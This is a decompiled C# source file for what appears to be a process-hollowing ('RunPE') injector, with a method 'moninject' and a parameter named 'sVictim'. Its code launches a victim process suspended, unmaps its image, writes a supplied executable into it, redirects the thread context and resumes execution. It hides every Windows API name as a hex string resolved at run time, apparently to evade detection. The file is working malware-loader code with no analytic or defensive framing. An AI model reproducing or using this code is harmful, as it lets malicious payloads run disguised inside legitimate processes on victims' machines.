using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace WindowsApplication;

public sealed class ganjaman : NativeDllCalls
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	private struct Struct0
	{
		public int int_0;

		public string string_0;

		public string string_1;

		public string string_2;

		public int int_1;

		public int int_2;

		public int int_3;

		public int int_4;

		public int int_5;

		public int int_6;

		public int int_7;

		public int int_8;

		public short short_0;

		public short short_1;

		public int int_9;

		public int int_10;

		public int int_11;

		public int int_12;
	}

	private struct Struct1
	{
		public IntPtr intptr_0;

		public IntPtr intptr_1;

		public int int_0;

		public int int_1;
	}

	private struct Struct2
	{
		public ushort ushort_0;

		public ushort ushort_1;

		public ushort ushort_2;

		public ushort ushort_3;

		public ushort ushort_4;

		public ushort ushort_5;

		public ushort ushort_6;

		public ushort ushort_7;

		public ushort ushort_8;

		public ushort ushort_9;

		public ushort ushort_10;

		public ushort ushort_11;

		public ushort ushort_12;

		public ushort ushort_13;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
		public ushort[] ushort_14;

		public ushort ushort_15;

		public ushort ushort_16;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
		public ushort[] ushort_17;

		public int int_0;
	}

	private struct Struct3
	{
		public int int_0;

		public IntPtr intptr_0;

		public int int_1;
	}

	private struct Struct4
	{
		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public uint uint_3;

		public uint uint_4;

		public uint uint_5;

		public uint uint_6;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
		public byte[] byte_0;

		public uint uint_7;
	}

	private struct Struct5
	{
		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public uint uint_3;

		public uint uint_4;

		public uint uint_5;

		public uint uint_6;

		public Struct4 struct4_0;

		public uint uint_7;

		public uint uint_8;

		public uint uint_9;

		public uint uint_10;

		public uint uint_11;

		public uint uint_12;

		public uint uint_13;

		public uint uint_14;

		public uint uint_15;

		public uint uint_16;

		public uint uint_17;

		public uint uint_18;

		public uint uint_19;

		public uint uint_20;

		public uint uint_21;

		public uint uint_22;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
		public byte[] byte_0;
	}

	private struct Struct6
	{
		public ushort ushort_0;

		public byte byte_0;

		public byte byte_1;

		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public uint uint_3;

		public uint uint_4;

		public uint uint_5;

		public uint uint_6;

		public uint uint_7;

		public uint uint_8;

		public ushort ushort_1;

		public ushort ushort_2;

		public ushort ushort_3;

		public ushort ushort_4;

		public ushort ushort_5;

		public ushort ushort_6;

		public uint uint_9;

		public uint uint_10;

		public uint uint_11;

		public uint uint_12;

		public ushort ushort_7;

		public ushort ushort_8;

		public uint uint_13;

		public uint uint_14;

		public uint uint_15;

		public uint uint_16;

		public uint uint_17;

		public uint uint_18;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
		public Struct8[] struct8_0;
	}

	private struct Struct7
	{
		public ushort ushort_0;

		public ushort ushort_1;

		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public ushort ushort_2;

		public ushort ushort_3;
	}

	private struct Struct8
	{
		public uint uint_0;

		public uint uint_1;
	}

	private struct Struct9
	{
		public uint uint_0;

		public Struct7 struct7_0;

		public Struct6 struct6_0;
	}

	private struct Struct10
	{
		public uint uint_0;

		public uint uint_1;
	}

	private struct Struct11
	{
		public byte byte_0;

		public Struct10 struct10_0;

		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public uint uint_3;

		public uint uint_4;

		public ushort ushort_0;

		public ushort ushort_1;

		public uint uint_5;
	}

	private enum Enum0
	{
		const_0 = 23117,
		const_1 = 17742,
		const_2 = 17740,
		const_3 = 17740,
		const_4 = 17744
	}

	private delegate uint Delegate0(IntPtr hThread);

	private delegate bool Delegate1(IntPtr hThread, ref Struct5 lpContext);

	private delegate bool Delegate2(IntPtr hThread, ref Struct5 lpContext);

	private delegate bool Delegate3(string lpApplicationName, string lpCommandLine, ref Struct3 lpProcessAttributes, ref Struct3 lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref Struct0 lpStartupInfo, out Struct1 lpProcessInformation);

	private delegate bool Delegate4(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int iSize, out int lpNumberOfBytesWritten);

	private delegate int Delegate5(IntPtr hProcess, int lpBaseAddress, ref IntPtr lpbuffer, int size, ref int lpNumberOfBytesRead);

	private delegate long Delegate6(IntPtr hProcess, IntPtr BaseAddress);

	private delegate IntPtr Delegate7(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

	private delegate int Delegate8(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, UIntPtr flNewProtect, [Out] uint lpflOldProtect);

	private const int int_0 = 65536;

	private const int int_1 = 65538;

	private const long long_0 = 4096L;

	private const long long_1 = 8192L;

	private const long long_2 = 64L;

	private const long long_3 = 32L;

	private const long long_4 = 16L;

	private const long long_5 = 1L;

	private const long long_6 = 4L;

	private const uint uint_0 = 2u;

	private const string string_0 = "0x6b65726e656c3332";

	private const string string_1 = "0x6e74646c6c";

	[DebuggerNonUserCode]
	public ganjaman()
	{
	}

	private long method_0(long long_7)
	{
		object[] array = new object[8] { 1L, 16L, 2u, 32L, 4L, 64L, 4L, 64L };
		return Conversions.ToLong(array[checked((int)method_1(long_7, 29L))]);
	}

	private long method_1(long long_7, long long_8)
	{
		return checked((long)Math.Round(method_2(long_7) / Math.Pow(2.0, long_8)));
	}

	private double method_2(long long_7)
	{
		if (long_7 < 0L)
		{
			return (double)long_7 + 4294967296.0;
		}
		return long_7;
	}

	public bool moninject(string cheminexe, string rutime)
	{
		if (File.Exists(cheminexe))
		{
			byte[] b = File.ReadAllBytes(cheminexe);
			return moninject(b, rutime);
		}
		bool result = default(bool);
		return result;
	}

	public bool moninject(byte[] b, string sVictim)
	{
		Struct2 @struct = default(Struct2);
		Struct5 lpContext = default(Struct5);
		Struct9 struct2 = default(Struct9);
		Struct11 struct3 = default(Struct11);
		Struct1 lpProcessInformation = default(Struct1);
		Struct0 lpStartupInfo = default(Struct0);
		Struct3 lpProcessAttributes = default(Struct3);
		Struct3 lpThreadAttributes = default(Struct3);
		GCHandle gCHandle = GCHandle.Alloc(b, GCHandleType.Pinned);
		int num = gCHandle.AddrOfPinnedObject().ToInt32();
		object? obj = Marshal.PtrToStructure(gCHandle.AddrOfPinnedObject(), @struct.GetType());
		Struct2 struct4 = default(Struct2);
		@struct = ((obj != null) ? ((Struct2)obj) : struct4);
		gCHandle.Free();
		Delegate3 @delegate = (Delegate3)DynamicCall("0x6b65726e656c3332", "0x43726561746550726f6365737341", typeof(Delegate3));
		IntPtr lpEnvironment = default(IntPtr);
		if (!@delegate(null, sVictim, ref lpProcessAttributes, ref lpThreadAttributes, bInheritHandles: false, 4u, lpEnvironment, null, ref lpStartupInfo, out lpProcessInformation))
		{
			return false;
		}
		int value = checked(num + @struct.int_0);
		IntPtr ptr = new IntPtr(value);
		object? obj2 = Marshal.PtrToStructure(ptr, struct2.GetType());
		Struct9 struct5 = default(Struct9);
		struct2 = ((obj2 != null) ? ((Struct9)obj2) : struct5);
		lpStartupInfo.int_0 = Strings.Len((object)lpStartupInfo);
		lpContext.uint_0 = 65538u;
		if (((long)struct2.uint_0 != 17744L) | (@struct.ushort_0 != 23117))
		{
			return false;
		}
		Delegate1 delegate2 = (Delegate1)DynamicCall("0x6b65726e656c3332", "0x476574546872656164436f6e74657874", typeof(Delegate1));
		Delegate5 delegate3 = (Delegate5)DynamicCall("0x6b65726e656c3332", "0x5265616450726f636573734d656d6f7279", typeof(Delegate5));
		Delegate6 delegate4 = (Delegate6)DynamicCall("0x6e74646c6c", "0x5a77556e6d6170566965774f6653656374696f6e", typeof(Delegate6));
		bool num2 = delegate2(lpProcessInformation.intptr_1, ref lpContext);
		IntPtr intptr_ = lpProcessInformation.intptr_0;
		int num4;
		long num3 = default(long);
		checked
		{
			int lpBaseAddress = (int)(unchecked((long)lpContext.uint_13) + 8L);
			ptr = (IntPtr)num3;
			int lpNumberOfBytesRead = 0;
			num4 = delegate3(intptr_, lpBaseAddress, ref ptr, 4, ref lpNumberOfBytesRead);
			num3 = (long)ptr;
		}
		if ((num2 && num4 >= 0) & (delegate4(lpProcessInformation.intptr_0, (IntPtr)num3) >= 0L))
		{
			Delegate7 delegate5 = (Delegate7)DynamicCall("0x6b65726e656c3332", "0x5669727475616c416c6c6f634578", typeof(Delegate7));
			uint num5 = checked((uint)(int)delegate5(lpProcessInformation.intptr_0, (IntPtr)struct2.struct6_0.uint_6, struct2.struct6_0.uint_10, 12288u, 4u));
			if ((long)num5 != 0L)
			{
				Delegate4 delegate6 = (Delegate4)DynamicCall("0x6b65726e656c3332", "0x577269746550726f636573734d656d6f7279", typeof(Delegate4));
				Delegate4 delegate7 = delegate6;
				IntPtr intptr_2 = lpProcessInformation.intptr_0;
				IntPtr lpBaseAddress2 = (IntPtr)num5;
				Delegate2 delegate11;
				Delegate0 delegate12;
				checked
				{
					int iSize = (int)struct2.struct6_0.uint_11;
					uint num6 = default(uint);
					int lpNumberOfBytesRead = (int)num6;
					delegate7(intptr_2, lpBaseAddress2, b, iSize, out lpNumberOfBytesRead);
					num6 = (uint)lpNumberOfBytesRead;
					long num7 = @struct.int_0 + 248;
					int num8 = unchecked((int)struct2.struct7_0.ushort_1) - 1;
					Struct11 struct6 = default(Struct11);
					for (int i = 0; i <= num8; i++)
					{
						ptr = new IntPtr(num + num7 + i * 40);
						object? obj3 = Marshal.PtrToStructure(ptr, struct3.GetType());
						struct3 = ((obj3 != null) ? ((Struct11)obj3) : struct6);
						byte[] array = new byte[(int)struct3.uint_1 + 1];
						int num9 = (int)(unchecked((long)struct3.uint_1) - 1L);
						for (int j = 0; j <= num9; j++)
						{
							array[j] = b[(int)(unchecked((long)struct3.uint_2) + unchecked((long)j))];
						}
						delegate6 = (Delegate4)DynamicCall("0x6b65726e656c3332", "0x577269746550726f636573734d656d6f7279", typeof(Delegate4));
						Delegate8 delegate8 = (Delegate8)DynamicCall("0x6b65726e656c3332", "0x5669727475616c50726f746563744578", typeof(Delegate8));
						Delegate4 delegate9 = delegate6;
						IntPtr intptr_3 = lpProcessInformation.intptr_0;
						IntPtr lpBaseAddress3 = (IntPtr)(num5 + struct3.uint_0);
						int iSize2 = (int)struct3.uint_1;
						lpNumberOfBytesRead = (int)num6;
						delegate9(intptr_3, lpBaseAddress3, array, iSize2, out lpNumberOfBytesRead);
						num6 = (uint)lpNumberOfBytesRead;
						delegate8(lpProcessInformation.intptr_0, (IntPtr)(num5 + struct3.uint_0), (UIntPtr)struct3.struct10_0.uint_1, (UIntPtr)(ulong)method_0(struct3.uint_5), (uint)num3);
					}
					byte[] bytes = BitConverter.GetBytes(num5);
					delegate6 = (Delegate4)DynamicCall("0x6b65726e656c3332", "0x577269746550726f636573734d656d6f7279", typeof(Delegate4));
					Delegate4 delegate10 = delegate6;
					IntPtr intptr_4 = lpProcessInformation.intptr_0;
					IntPtr lpBaseAddress4 = (IntPtr)(unchecked((long)lpContext.uint_13) + 8L);
					lpNumberOfBytesRead = (int)num6;
					delegate10(intptr_4, lpBaseAddress4, bytes, 4, out lpNumberOfBytesRead);
					num6 = (uint)lpNumberOfBytesRead;
					lpContext.uint_16 = num5 + struct2.struct6_0.uint_3;
					delegate11 = (Delegate2)DynamicCall("0x6b65726e656c3332", "0x536574546872656164436f6e74657874", typeof(Delegate2));
					delegate12 = (Delegate0)DynamicCall("0x6b65726e656c3332", "0x526573756d65546872656164", typeof(Delegate0));
				}
				if (delegate11(lpProcessInformation.intptr_1, ref lpContext))
				{
					return (long)delegate12(lpProcessInformation.intptr_1) > 0L;
				}
				bool result = default(bool);
				return result;
			}
			return false;
		}
		return false;
	}
}
